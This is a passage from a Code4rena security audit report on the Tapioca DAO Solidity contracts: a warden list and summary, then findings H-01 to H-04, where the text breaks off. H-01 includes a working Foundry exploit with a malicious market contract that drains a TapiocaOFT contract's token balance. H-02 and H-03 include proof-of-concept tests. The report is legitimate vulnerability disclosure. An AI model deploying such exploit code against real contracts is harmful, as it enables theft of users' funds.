---
sponsor: "Tapioca DAO"
slug: "2023-07-tapioca"
date: "2023-11-16" 
title: "Tapioca DAO"
findings: "https://github.com/code-423n4/2023-07-tapioca-findings/issues"
contest: 261
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Tapioca DAO smart contract system written in Solidity. The audit took place between July 5—August 4 2023.

## Wardens

134 Wardens contributed reports to the Tapioca DAO:

  1. [GalloDaSballo](https://code4rena.com/@GalloDaSballo)
  2. [peakbolt](https://code4rena.com/@peakbolt)
  3. KIntern\_NA ([duc](https://code4rena.com/@duc) and [TrungOre](https://code4rena.com/@TrungOre))
  4. [windhustler](https://code4rena.com/@windhustler)
  5. [carrotsmuggler](https://code4rena.com/@carrotsmuggler)
  6. [0x73696d616f](https://code4rena.com/@0x73696d616f)
  7. [zzzitron](https://code4rena.com/@zzzitron)
  8. [kaden](https://code4rena.com/@kaden)
  9. [cergyk](https://code4rena.com/@cergyk)
  10. [ItsNio](https://code4rena.com/@ItsNio)
  11. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  12. Ack ([plotchy](https://code4rena.com/@plotchy), [popular00](https://code4rena.com/@popular00), and [igorline](https://code4rena.com/@igorline))
  13. [Vagner](https://code4rena.com/@Vagner)
  14. [dirk\_y](https://code4rena.com/@dirk_y)
  15. [xuwinnie](https://code4rena.com/@xuwinnie)
  16. [0xStalin](https://code4rena.com/@0xStalin)
  17. [Koolex](https://code4rena.com/@Koolex)
  18. [bin2chen](https://code4rena.com/@bin2chen)
  19. [ladboy233](https://code4rena.com/@ladboy233)
  20. [SaeedAlipoor01988](https://code4rena.com/@SaeedAlipoor01988)
  21. [0xRobocop](https://code4rena.com/@0xRobocop)
  22. [mojito\_auditor](https://code4rena.com/@mojito_auditor)
  23. [HE1M](https://code4rena.com/@HE1M)
  24. [Sathish9098](https://code4rena.com/@Sathish9098)
  25. [Madalad](https://code4rena.com/@Madalad)
  26. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  27. [zzebra83](https://code4rena.com/@zzebra83)
  28. [0xWaitress](https://code4rena.com/@0xWaitress)
  29. [chaduke](https://code4rena.com/@chaduke)
  30. unsafesol ([Angry\_Mustache\_Man](https://code4rena.com/@Angry_Mustache_Man) and [devblixt](https://code4rena.com/@devblixt))
  31. [n1punp](https://code4rena.com/@n1punp)
  32. [0xnev](https://code4rena.com/@0xnev)
  33. [0x007](https://code4rena.com/@0x007)
  34. [c7e7eff](https://code4rena.com/@c7e7eff)
  35. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  36. [K42](https://code4rena.com/@K42)
  37. [JCK](https://code4rena.com/@JCK)
  38. [minhtrng](https://code4rena.com/@minhtrng)
  39. [cryptonue](https://code4rena.com/@cryptonue)
  40. [ayeslick](https://code4rena.com/@ayeslick)
  41. [7e1e](https://code4rena.com/@7e1e)
  42. [erebus](https://code4rena.com/@erebus)
  43. LosPollosHermanos ([jc1](https://code4rena.com/@jc1) and [scaraven](https://code4rena.com/@scaraven))
  44. [0xTheC0der](https://code4rena.com/@0xTheC0der)
  45. BPZ ([Bitcoinfever244](https://code4rena.com/@Bitcoinfever244), [PrasadLak](https://code4rena.com/@PrasadLak), and [zinc42](https://code4rena.com/@zinc42))
  46. [adeolu](https://code4rena.com/@adeolu)
  47. [glcanvas](https://code4rena.com/@glcanvas)
  48. [zhaojie](https://code4rena.com/@zhaojie)
  49. [Rolezn](https://code4rena.com/@Rolezn)
  50. [naman1778](https://code4rena.com/@naman1778)
  51. [ReyAdmirado](https://code4rena.com/@ReyAdmirado)
  52. [dharma09](https://code4rena.com/@dharma09)
  53. [0xfuje](https://code4rena.com/@0xfuje)
  54. [Ruhum](https://code4rena.com/@Ruhum)
  55. [jasonxiale](https://code4rena.com/@jasonxiale)
  56. plainshift ([thank\_you](https://code4rena.com/@thank_you) and [surya](https://code4rena.com/@surya))
  57. [0xrugpull\_detector](https://code4rena.com/@0xrugpull_detector)
  58. [jaraxxus](https://code4rena.com/@jaraxxus)
  59. [Udsen](https://code4rena.com/@Udsen)
  60. [wahedtalash77](https://code4rena.com/@wahedtalash77)
  61. [mgf15](https://code4rena.com/@mgf15)
  62. [kodyvim](https://code4rena.com/@kodyvim)
  63. [RedOneN](https://code4rena.com/@RedOneN)
  64. [Kaysoft](https://code4rena.com/@Kaysoft)
  65. [kutugu](https://code4rena.com/@kutugu)
  66. [Nyx](https://code4rena.com/@Nyx)
  67. [ltyu](https://code4rena.com/@ltyu)
  68. [rokinot](https://code4rena.com/@rokinot)
  69. [0xG0P1](https://code4rena.com/@0xG0P1)
  70. [andy](https://code4rena.com/@andy)
  71. [hassan-truscova](https://code4rena.com/@hassan-truscova)
  72. [nadin](https://code4rena.com/@nadin)
  73. [gizzy](https://code4rena.com/@gizzy)
  74. [Breeje](https://code4rena.com/@Breeje)
  75. [DelerRH](https://code4rena.com/@DelerRH)
  76. [hendrik](https://code4rena.com/@hendrik)
  77. [Raihan](https://code4rena.com/@Raihan)
  78. [paweenp](https://code4rena.com/@paweenp)
  79. [Brenzee](https://code4rena.com/@Brenzee)
  80. [vagrant](https://code4rena.com/@vagrant)
  81. [ak1](https://code4rena.com/@ak1)
  82. [clash](https://code4rena.com/@clash)
  83. [marcKn](https://code4rena.com/@marcKn)
  84. [tsvetanovv](https://code4rena.com/@tsvetanovv)
  85. [Limbooo](https://code4rena.com/@Limbooo)
  86. [SY\_S](https://code4rena.com/@SY_S)
  87. [petrichor](https://code4rena.com/@petrichor)
  88. [ybansal2403](https://code4rena.com/@ybansal2403)
  89. [0xhex](https://code4rena.com/@0xhex)
  90. [0xta](https://code4rena.com/@0xta)
  91. [flutter\_developer](https://code4rena.com/@flutter_developer)
  92. [SAQ](https://code4rena.com/@SAQ)
  93. [xfu](https://code4rena.com/@xfu)
  94. [LeoS](https://code4rena.com/@LeoS)
  95. [IllIllI](https://code4rena.com/@IllIllI)
  96. [wangxx2026](https://code4rena.com/@wangxx2026)
  97. [dontonka](https://code4rena.com/@dontonka)
  98. [hack3r-0m](https://code4rena.com/@hack3r-0m)
  99. [pks\_](https://code4rena.com/@pks_)
  100. [offside0011](https://code4rena.com/@offside0011)
  101. [CrypticShepherd](https://code4rena.com/@CrypticShepherd)
  102. [ACai](https://code4rena.com/@ACai)
  103. [0xSky](https://code4rena.com/@0xSky)
  104. [ck](https://code4rena.com/@ck)
  105. [iglyx](https://code4rena.com/@iglyx)
  106. [John\_Femi](https://code4rena.com/@John_Femi)
  107. [Walter](https://code4rena.com/@Walter)
  108. [Deekshith99](https://code4rena.com/@Deekshith99)
  109. [SPYBOY](https://code4rena.com/@SPYBOY)
  110. [JP\_Courses](https://code4rena.com/@JP_Courses)
  111. [Z3R0](https://code4rena.com/@Z3R0)
  112. [audityourcontracts](https://code4rena.com/@audityourcontracts)
  113. [l3r0ux](https://code4rena.com/@l3r0ux)
  114. Tatakae ([SaharDevep](https://code4rena.com/@SaharDevep) and [mahdikarimi](https://code4rena.com/@mahdikarimi))
  115. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  116. [hals](https://code4rena.com/@hals)
  117. [SooYa](https://code4rena.com/@SooYa)
  118. [CryptoYulia](https://code4rena.com/@CryptoYulia)
  119. [ABA](https://code4rena.com/@ABA)
  120. [catwhiskeys](https://code4rena.com/@catwhiskeys)
  121. [rumen](https://code4rena.com/@rumen)
  122. [0xadrii](https://code4rena.com/@0xadrii)
  123. [Topmark](https://code4rena.com/@Topmark)
  124. [Oxsadeeq](https://code4rena.com/@Oxsadeeq)
  125. [TiesStevelink](https://code4rena.com/@TiesStevelink)

This audit was judged by [LSDan](https://code4rena.com/@LSDan).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 159 unique vulnerabilities. Of these vulnerabilities, 60 received a risk rating in the category of HIGH severity and 99 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 79 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 19 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Tapioca DAO repository](https://github.com/code-423n4/2023-07-tapioca), and is composed of 68 smart contracts written in the Solidity programming language and includes 13291 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **IllIllI-bot** from warden [IllIllI](https://code4rena.com/@IllIllI), generated the [Automated Findings report](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (60)
## [[H-01] TOFT in (m)TapiocaOft contracts can be stolen by calling removeCollateral() with a malicious removeParams.market](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1695)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1695)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L190> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L516> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L230-L231>

The `TOFT` available in the `TapiocaOFT` contract can be stolen when calling `removeCollateral()` with a malicious market.

### Proof of Concept

`(m)TapiocaOFT` inherit `BaseTOFT`, which has a function `removeCollateral()` that accepts a market address as an argument. This function calls `_lzSend()` internally on the source chain, which then is forwarded to the destination chain by the relayer and calls `lzReceive()`.

`lzReceive()` reaches `_nonBlockingLzReceive()` in `BaseTOFT` and delegate calls to the `BaseTOFTMarketModule` on function `remove()`. This function approves `TOFT` to the `removeParams.market`  and then calls function `removeCollateral()` of the provided market. There is no validation whatsoever in this address, such that a malicious market can be provided that steals all funds, as can be seen below:

```solidity
function remove(bytes memory _payload) public {
    ...
    approve(removeParams.market, removeParams.share); // no validation prior to this 2 calls
    IMarket(removeParams.market).removeCollateral(
        to,
        to,
        removeParams.share
    );
    ...
}
```

The following POC in Foundry demonstrates this vulnerability, the attacker is able to steal all `TOFT` in `mTapiocaOFT`:

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTMarketModule} from "contracts/tOFT/modules/BaseTOFTMarketModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import {ITapiocaOFT} from "tapioca-periph/contracts/interfaces/ITapiocaOFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousMarket {
    address public immutable attacker;
    address public immutable tapiocaOft;

    constructor(address attacker_, address tapiocaOft_) {
        attacker = attacker_;
        tapiocaOft = tapiocaOft_;
    } 

    function removeCollateral(address, address, uint256 share) external {
        IERC20(tapiocaOft).transferFrom(msg.sender, attacker, share);
    }
}

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_MARKET_REMOVE_COLLATERAL = 772;

    function test_POC_StealAllAssetsInTapiocaOFT_RemoveCollateral_MaliciousMarket()
        public
    {
        vm.createSelectFork("https://eth.llamarpc.com");

        address marketModule_ = address(
            new BaseTOFTMarketModule(
                address(LZ_ENDPOINT),
                address(0),
                IYieldBoxBase(address(2)),
                "SomeName",
                "SomeSymbol",
                18,
                block.chainid
            )
        );

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            address(0),
            IYieldBoxBase(address(3)),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(address(2)),
            payable(marketModule_),
            payable(address(4))
        );

        // TOFT is acummulated in the TapiocaOft contract and can be stolen by the malicious market
        // for example, strategyDeposit of the BaseTOFTMarketModule credits TOFT to tapiocaOft
        uint256 tOftInTapiocaOft_ = 1 ether;
        deal(address(tapiocaOft_), address(tapiocaOft_), tOftInTapiocaOft_);

        address attacker_ = makeAddr("attacker");
        deal(attacker_, 1 ether); // lz fees

        uint16 lzDstChainId_ = 102;
        address zroPaymentAddress_ = address(0);
        ICommonData.IWithdrawParams memory withdrawParams_;
        ITapiocaOFT.IRemoveParams memory removeParams_;
        removeParams_.share = tOftInTapiocaOft_;
        removeParams_.market = address(new MaliciousMarket(attacker_, address(tapiocaOft_)));
        ICommonData.IApproval[] memory approvals_;
        bytes memory adapterParams_;

        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));

        vm.prank(attacker_);
        tapiocaOft_.removeCollateral{value: 1 ether}(
            attacker_,
            attacker_,
            lzDstChainId_,
            zroPaymentAddress_,
            withdrawParams_,
            removeParams_,
            approvals_,
            adapterParams_
        );

        bytes memory lzPayload_ = abi.encode(
            PT_MARKET_REMOVE_COLLATERAL,
            attacker_,
            attacker_,
            bytes32(bytes20(attacker_)),
            removeParams_,
            withdrawParams_,
            approvals_
        );

        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(lzDstChainId_, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
        assertEq(tapiocaOft_.balanceOf(attacker_), tOftInTapiocaOft_);
    }
}
```

</details>

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Whitelist the `removeParams.market` address to prevent users from providing malicious markets.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1695#issuecomment-1697852377)**

***

## [[H-02] `exitPosition` in `TapiocaOptionBroker` may incorrectly inflate position weights](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1623)
*Submitted by [ItsNio](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1623), also found by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1103)*

Users who `participate()` and place stakes with large magnitudes may have their weight removed prematurely from `pool.cumulative`, hence causing the weight logic of participation to be wrong. `pool.cumulative` will have an incomplete image of the actual pool hence allowing future users to have divergent power when they should not. In particular, this occurs during the `exitPosition()` function.

### Proof of Concept

This vulnerability stems from `exitPosition()` using the current `pool.AverageMagnitude` instead of the respective magnitudes of the user's weights to update `pool.cumulative` on line 316. Hence, when users call `exitPosition()`, the amount that `pool.cumulative` is updated but may not be representative of the weight of the user's input.

Imagine if we have three users, Alice, Bob, and Charlie who all decide to call `participate()`. Alice calls `participate()` with a smaller amount and a smaller time, hence having a weight of 10. Bob calls `participate()` with a larger amount and a larger time, hence having a weight of 50. Charlie calls `participate()` with a weight of 20.

### Scenario

*   Alice calls `participate()` first at time 0 with the aforementioned amount and time. The `pool.cumulative` is now 10 and the `pool.AverageMagnitude` is 10 as well. Alice's position will expire at time 10.
*   Bob calls `participate()` at time 5. The `pool.cumulative` is now 10 + 50 = 60 and the `pool.AverageMagnitude` is 50.
*   Alice calls `exitPosition()` at time 10. `pool.cumulative` is 60, but `pool.AverageMagnitude` is still 50. Hence, `pool.cumulative` will be decreased by 50, even though the weight of Alice's input is 10.
*   Charlie calls `participate` with weight 20. Charlie will have divergent power in the pool with both Bob and Charlie, since 20 > `pool.cumulative` (10).

If Alice does not participate at all, Charlie will not have divergent power in a pool with Bob and Charlie, since the `pool.cumulative` = Bob's weight = 50 > Charlie's weight (20).

We have provided a test to demonstrate the `pool.cumulative` inflation. Copy the following code into`tap-token-audit/test/oTAP/tOB.test.ts` as one of the tests.

<details>

```typescript
it('POC', async () => {
        const {
            signer,
            tOLP,
            tOB,
            tapOFT,
            sglTokenMock,
            sglTokenMockAsset,
            yieldBox,
            oTAP,
        } = await loadFixture(setupFixture);

        // Setup tOB
        await tOB.oTAPBrokerClaim();
        await tapOFT.setMinter(tOB.address);

        // Setup - register a singularity, mint and deposit in YB, lock in tOLP
        const amount = 3e10;
        const lockDurationA = 10;
        const lockDurationB = 100;
        await tOLP.registerSingularity(
            sglTokenMock.address,
            sglTokenMockAsset,
            0,
        );

        await sglTokenMock.freeMint(amount);
        await sglTokenMock.approve(yieldBox.address, amount);
        await yieldBox.depositAsset(
            sglTokenMockAsset,
            signer.address,
            signer.address,
            amount,
            0,
        );

        const ybAmount = await yieldBox.toAmount(
            sglTokenMockAsset,
            await yieldBox.balanceOf(signer.address, sglTokenMockAsset),
            false,
        );
        await yieldBox.setApprovalForAll(tOLP.address, true);
        //A (short less impact)
        console.log(ybAmount);
        await tOLP.lock(
            signer.address,
            sglTokenMock.address,
            lockDurationA,
            ybAmount.div(100),
        );
        //B (long, big impact)
        await tOLP.lock(
            signer.address,
            sglTokenMock.address,
            lockDurationB,
            ybAmount.div(2),
        );
        const tokenID = await tOLP.tokenCounter();
        const snapshot = await takeSnapshot();
        console.log("A Duration: ", lockDurationA, " B Duration: ", lockDurationB);
        // Just A Participate
        console.log("Just A participation");
        await tOLP.approve(tOB.address, tokenID.sub(1));
        await tOB.participate(tokenID.sub(1));
        const participationA = await tOB.participants(tokenID.sub(1));
        const oTAPTknID = await oTAP.mintedOTAP();
        await time.increase(lockDurationA);
        const prevPoolState = await tOB.twAML(sglTokenMockAsset);
        console.log("[B4] Just A Cumulative: ", await prevPoolState.cumulative);
        console.log("[B4] Just A Average: ", participationA.averageMagnitude);
        await oTAP.approve(tOB.address, oTAPTknID);
        await tOB.exitPosition(oTAPTknID);
        console.log("Exit A position");
        const newPoolState = await tOB.twAML(sglTokenMockAsset);
        console.log("[A4] Just A Cumulative: ", await newPoolState.cumulative);
        console.log("[A4] Just A Average: ", await participationA.averageMagnitude);

        //Both Participations
        console.log();
        console.log("Run both participation---");
        const ctime1 = new Date();
        console.log("Time: ", ctime1);
        //A and B Participate
        await snapshot.restore();
        //Before everything
        const initPoolState = await tOB.twAML(sglTokenMockAsset);
        console.log("[IN] Initial Cumulative: ", await initPoolState.cumulative);
        //First participate A
        await tOLP.approve(tOB.address, tokenID.sub(1));
        await tOB.participate(tokenID.sub(1));
        const xparticipationA = await tOB.participants(tokenID.sub(1));
        const ATknID = await oTAP.mintedOTAP();
        console.log("Participate A (smaller weight)");
        console.log("[ID] A Token ID: ", ATknID);
        const xprevPoolState = await tOB.twAML(sglTokenMockAsset);
        console.log("[B4] Both A Cumulative: ", await xprevPoolState.cumulative);
        console.log("[B4] Both A Average: ", await xparticipationA.averageMagnitude);
        console.log();

        //Time skip to half A's duration
        await time.increase(5);
        const ctime2 = new Date();
        console.log("Participate B (larger weight), Time(+5): ", ctime2);

        //Participate B
        await tOLP.approve(tOB.address, tokenID);
        await tOB.participate(tokenID);
        const xparticipationB = await tOB.participants(tokenID);
        const BTknID = await oTAP.mintedOTAP();
        console.log("[ID] B Token ID: ", ATknID);
        const xbothPoolState = await tOB.twAML(sglTokenMockAsset);
        console.log("[B4] Both AB Cumulative: ", await xbothPoolState.cumulative);
        console.log("[B4] Both B Average: ", await xparticipationB.averageMagnitude);
        
        //Time skip end A
        await time.increase(6);
        await oTAP.approve(tOB.address, ATknID);
        await tOB.exitPosition(ATknID);
        const exitAPoolState = await tOB.twAML(sglTokenMockAsset);
        const ctime3 = new Date();
        console.log();
        console.log("Exit A (Dispraportionate Weight, Time(+6 Expire A): ", ctime3);
        console.log("[!X!] Just B Cumulative: ", await exitAPoolState.cumulative);
        console.log("[A4] Just B Average: ", xparticipationB.averageMagnitude);


        //TIme skip end B
        await time.increase(lockDurationB);
        await oTAP.approve(tOB.address, BTknID);
        await tOB.exitPosition(BTknID);
        const exitBPoolState = await tOB.twAML(sglTokenMockAsset);
        const ctime4 = new Date();
        console.log("Exit B, Time(+100 Expire B): ", ctime4);
        console.log("[A4] END Cumulative: ", await exitBPoolState.cumulative);

    });
```

</details>

This test runs the aforementioned scenario.

### Expected Output:

```bash
BigNumber { value: "30000000000" }
A Duration:  10  B Duration:  100
Just A participation
[B4] Just A Cumulative:  BigNumber { value: "10" }
[B4] Just A Average:  BigNumber { value: "10" }
Exit A position
[A4] Just A Cumulative:  BigNumber { value: "0" }
[A4] Just A Average:  BigNumber { value: "10" }

Run both participation---
Time:  2023-08-03T21:40:52.700Z
[IN] Initial Cumulative:  BigNumber { value: "0" }
Participate A (smaller weight)
[ID] A Token ID:  BigNumber { value: "1" }
[B4] Both A Cumulative:  BigNumber { value: "10" }
[B4] Both A Average:  BigNumber { value: "10" }

Participate B (larger weight), Time(+5):  2023-08-03T21:40:52.801Z
[ID] B Token ID:  BigNumber { value: "1" }
[B4] Both AB Cumulative:  BigNumber { value: "60" }
[B4] Both B Average:  BigNumber { value: "50" }

Exit A (Dispraportionate Weight, Time(+6 Expire A):  2023-08-03T21:40:52.957Z
[!X!] Just B Cumulative:  BigNumber { value: "10" }
[A4] Just B Average:  BigNumber { value: "50" }
Exit B, Time(+100 Expire B):  2023-08-03T21:40:53.029Z
[A4] END Cumulative:  BigNumber { value: "0" }
    ✔ POC (1077ms) 
```

The POC is split into two parts:

The first part starting with `Just A Participation` is when just A enters and exits. This is correct, with the `pool.cumulative` increasing by 10 (the weight of A) and then being decreased by 10 when A exits.

The second part starting with `Run both participation---` describes the scenario mentioned by the bullet points. In particular, the `pool.cumulative` starts as 0 (`[IN] Initial Cumulative`).

Then, A enters the pool, and the `pool.cumulative` is increased to 10 (`[B4] Both A Cumulative`) similar to the first part.

Then, B enters the pool, before A exits. B has a weight of 50, thus the `pool.cumulative`increases to 60 (`[B4] Both AB Cumulative`).

The bug can be seen after the line beginning with `[!X!]`. The `pool.cumulative` labeled by "Just B Cumulative" is decreased by 60 - 10 = 50 when A exits, although the weight of A is only 10.

### Recommended Mitigation Steps

There may be a need to store weights at the time of adding a weight instead of subtracting the last computed weight in `exitPosition()`. For example, when Alice calls `participate()`, the weight at that time is stored and removed when `exitPosition()` is called.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1623#issuecomment-1696529465)**

***

## [[H-03] The amount of debt removed during `liquidation` may be worth more than the account's collateral](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1620)
*Submitted by [ItsNio](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1620)*

The contract decreases user's debts but may not take the full worth in collateral from the user, leading to the contract losing potential funds from the missing collateral.

### Proof of concept

During the `liquidate()` function call, the function `_updateBorrowAndCollateralShare()` is eventually invoked. This function liquidates a user's debt and collateral based on the value of the **collateral** they own.

In particular, the equivalent amount of debt, `availableBorrowPart` is calculated from the user's collateral on line 225 through the `computeClosingFactor()` function call.

Then, an additional fee through the `liquidationBonusAmount` is applied to the debt, which is then compared to the user's debt on line 240. The minimum of the two is assigned `borrowPart`, which intuitively means the maximum amount of debt that can be removed from the user's debt.

`borrowPart` is then increased by a bonus through `liquidationMultiplier`, and then converted to generate `collateralShare`, which represents the amount of collateral equivalent in value to `borrowPart` (plus some fees and bonus).

This new `collateralShare` may be more than the collateral that the user owns. In that case, the `collateralShare` is simply decreased to the user's collateral.

`collateralShare` is then removed from the user's collateral.

The problem lies in that although the `collateralShare` is equivalent to the `borrowPart`, or the debt removed from the user's account, it could be worth more than the collateral that the user owns in the first place. Hence, the contract loses out on funds, as debt is removed for less than it is actually worth.

To demonstrate, we provide a runnable POC.

### Preconditions

```solidity
... 
if (collateralShare > userCollateralShare[user]) {
        require(false, "collateralShare and borrowPart not worth the same"); //@audit add this line
        collateralShare = userCollateralShare[user];
    }
    userCollateralShare[user] -= collateralShare;
...
```

Add the `require` statement to line [261](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L261). This require statement essentially reverts the contract when the `if` condition satisfies. The `if` condition holds true when the `collateralShare` is greater that the user's collateral, which is the target bug.

Once the changes have been made, add the following test into the `singularity.test.ts` test in `tapioca-bar-audit/test`

### Code

<details>

```typescript
it('POC', async () => {
            const {
                usdc,
                wbtc,
                yieldBox,
                wbtcDepositAndAddAsset,
                usdcDepositAndAddCollateralWbtcSingularity,
                eoa1,
                approveTokensAndSetBarApproval,
                deployer,
                wbtcUsdcSingularity,
                multiSwapper,
                wbtcUsdcOracle,
                __wbtcUsdcPrice,
            } = await loadFixture(register);

            const assetId = await wbtcUsdcSingularity.assetId();
            const collateralId = await wbtcUsdcSingularity.collateralId();
            const wbtcMintVal = ethers.BigNumber.from((1e8).toString()).mul(1);
            const usdcMintVal = wbtcMintVal
                .mul(1e10)
                .mul(__wbtcUsdcPrice.div((1e18).toString()));

            // We get asset
            await wbtc.freeMint(wbtcMintVal);
            await usdc.connect(eoa1).freeMint(usdcMintVal);

            // We approve external operators
            await approveTokensAndSetBarApproval();
            await approveTokensAndSetBarApproval(eoa1);

            // We lend WBTC as deployer
            await wbtcDepositAndAddAsset(wbtcMintVal);
            expect(
                await wbtcUsdcSingularity.balanceOf(deployer.address),
            ).to.be.equal(await yieldBox.toShare(assetId, wbtcMintVal, false));

            // We deposit USDC collateral
            await usdcDepositAndAddCollateralWbtcSingularity(usdcMintVal, eoa1);
            expect(
                await wbtcUsdcSingularity.userCollateralShare(eoa1.address),
            ).equal(await yieldBox.toShare(collateralId, usdcMintVal, false));

            // We borrow 74% collateral, max is 75%

            console.log("Collateral amt: ", usdcMintVal);
            const wbtcBorrowVal = usdcMintVal
                .mul(74)
                .div(100)
                .div(__wbtcUsdcPrice.div((1e18).toString()))
                .div(1e10);
            console.log("WBTC borrow val: ", wbtcBorrowVal);
            console.log("[$] Original price: ", __wbtcUsdcPrice.div((1e18).toString()));
            await wbtcUsdcSingularity
                .connect(eoa1)
                .borrow(eoa1.address, eoa1.address, wbtcBorrowVal.toString());
            await yieldBox
                .connect(eoa1)
                .withdraw(
                    assetId,
                    eoa1.address,
                    eoa1.address,
                    wbtcBorrowVal,
                    0,
                );

            const data = new ethers.utils.AbiCoder().encode(['uint256'], [1]);
            // Can't liquidate
            await expect(
                wbtcUsdcSingularity.liquidate(
                    [eoa1.address],
                    [wbtcBorrowVal],
                    multiSwapper.address,
                    data,
                    data,
                ),
            ).to.be.reverted;
            console.log("Price Drop: 120%");
            const priceDrop = __wbtcUsdcPrice.mul(40).div(100);
            await wbtcUsdcOracle.set(__wbtcUsdcPrice.add(priceDrop));
            await wbtcUsdcSingularity.updateExchangeRate()
            console.log("Running liquidation... ");
            await expect(
                wbtcUsdcSingularity.liquidate(
                    [eoa1.address],
                    [wbtcBorrowVal],
                    multiSwapper.address,
                    data,
                    data,
                ),
            ).to.be.revertedWith("collateralShare and borrowPart not worth the same");
            console.log("[*] Reverted with reason: collateralShare and borrowPart not worth the same [Bug]");
            //console.log("Collateral Share after liquidation: ", (await wbtcUsdcSingularity.userCollateralShare(eoa1.address)));
            //console.log("Borrow part after liquidation: ", (await wbtcUsdcSingularity.userBorrowPart(eoa1.address)));
        });
```

</details>

### Expected Result

```bash
Collateral amt:  BigNumber { value: "10000000000000000000000" }
WBTC borrow val:  BigNumber { value: "74000000" }
[$] Original price:  BigNumber { value: "10000" }
Price Drop: 120%
Running liquidation... 
[*] Reverted with reason: collateralShare and borrowPart not worth the same [Bug]
      ✔ POC (2289ms)
```

As demonstrated, the function call reverts due to the `require` statement added in the preconditions.

### Recommended Mitigation

One potential mitigation for this issue would be to calculate the `borrowPart` depending on the existing users' collateral factoring in the fees and bonuses. The `collateralShare` with the fees and bonuses should not exceed the user's collateral.

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1620#issuecomment-1707830868)**


***

## [[H-04] Incorrect solvency check because it multiplies collateralizationRate by share not amount when calculating liquidation threshold](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1582)
*Submitted by [Koolex](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1582)*

When a Collateralized Debt Position (CDP) reaches that liquidation threshold, it becomes eligible for liquidation and anyone can repay a position in exchange for a portion of the collateral.
`Market._isSolvent` is used to check if the user is solvent. if not, then it can be liquidated. Here is the method body:

    function _isSolvent(
    	address user,
    	uint256 _exchangeRate
    ) internal view returns (bool) {
    	// accrue must have already been called!
    	uint256 borrowPart = userBorrowPart[user];
    	if (borrowPart == 0) return true;
    	uint256 collateralShare = userCollateralShare[user];
    	if (collateralShare == 0) return false;

    	Rebase memory _totalBorrow = totalBorrow;

    	return
    		yieldBox.toAmount(
    			collateralId,
    			collateralShare *
    				(EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
    				collateralizationRate,
    			false
    		) >=
    		// Moved exchangeRate here instead of dividing the other side to preserve more precision
    		(borrowPart * _totalBorrow.elastic * _exchangeRate) /
    			_totalBorrow.base;
    }

[Code link](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L402C1-L425C6)

